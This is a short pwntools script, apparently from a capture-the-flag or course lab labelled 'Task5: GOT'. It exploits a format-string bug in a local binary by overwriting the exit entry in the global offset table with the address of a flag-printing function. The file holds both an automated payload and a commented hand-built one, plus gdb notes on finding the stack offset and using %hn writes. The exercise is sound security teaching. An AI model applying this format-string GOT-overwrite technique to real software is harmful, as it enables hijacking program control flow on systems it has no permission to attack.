from pwn import *
#Task5: GOT
#conn = remote('140.113.207.240',8835)
conn = process('./GOT')
conn.recvline()


flag_func = 0x4011b6
EXIT_PLT = 0x404038
'''
def pad(s):
	return s + ("X"*(512-len(s)-8))

exploit = ""
exploit += "AAAAABBBBCCCC"
exploit += "%{}x".format(0x11b6 - len(exploit))
exploit += "%69$hn"
exploit = pad(exploit)
exploit += p64(EXIT_PLT).decode('unicode_escape')
'''
context.arch = 'amd64'
exploit = fmtstr_payload(6, {0x404038: 0x4011b6}, write_size='byte', numbwritten=0)
conn.sendline(exploit)
conn.recvline()
#conn.recvuntil('XXX8@@')
r=conn.recvline()
print(r)
conn.close()

#gdb x flag_func -> 0x4011b6
#disassemble vuln -> exit at PLT
#disassemble 0x4010c0 -> jump is referene the address of exit from glibc
#disassemble 0x404038 -> GOT
#set {int}0x404038=0x4011b6

#ABC -> check how far is strinf freom stack(?-th)
#buffer size 512
#flag 11 b6
#GOT  00 00
#place on the stack with null-byte -> fgets read null-byte
#printf must have not null-byte
#%100$p -> find offset -> $69$p (find address)
#write only two byte -> %hn (whole integer -> %n)
#%x: leak memory
#%n: returns the number of characters written so far by this call to the function

